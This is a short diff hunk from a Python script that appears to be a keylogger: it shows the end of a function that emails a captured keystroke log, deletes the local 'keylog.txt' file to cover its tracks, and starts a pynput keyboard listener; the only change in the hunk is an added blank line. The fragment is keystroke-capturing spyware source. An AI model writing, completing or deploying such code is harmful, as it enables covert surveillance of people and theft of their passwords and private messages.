@@ -42,6 +42,7 @@ def send_email():
     server.quit()
     attachment.close()
     os.remove("keylog.txt")
+    
 keys = []
 listener = pynput.keyboard.Listener(on_press=on_press, on_release=on_release)
 listener.start()
